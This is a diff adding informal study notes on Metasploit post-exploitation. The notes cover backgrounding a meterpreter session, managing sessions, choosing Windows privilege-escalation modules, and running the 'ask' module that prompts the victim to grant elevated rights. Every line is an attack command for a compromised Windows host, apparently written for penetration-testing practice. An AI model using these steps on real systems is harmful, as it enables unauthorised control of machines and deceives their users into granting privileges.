@@ -1,0 +1,24 @@
+1) moving the session in which we are working to background:::::::
+  meterpreter> background
+
+2)now you will enter msfconsole:::::
+      
+  msf exploit() > sessions -h                   //for help rearding sessions
+
+  msf exploit() > sessions -l                   //lists the running sessions
+
+3) msf exploit(handler) > sessions -i 5          //ID number of 5 comes to forward
+
+
+4) to escalating privilages::::::
+ 
+     
+    msf exploit(handler) > use post/windows/
+                         > use post/windows/escalate/                             //we can choose any among any exploits and use
+
+5) exploit TO gain PRIVILGES BY ASKING User:::::
+ 
+    msf exploit(handler) > use exploit/windows/local/ask
+                         > show options
+                         > set session 1                                      //session number we sent to background
+                         > exploit                                              // asks user
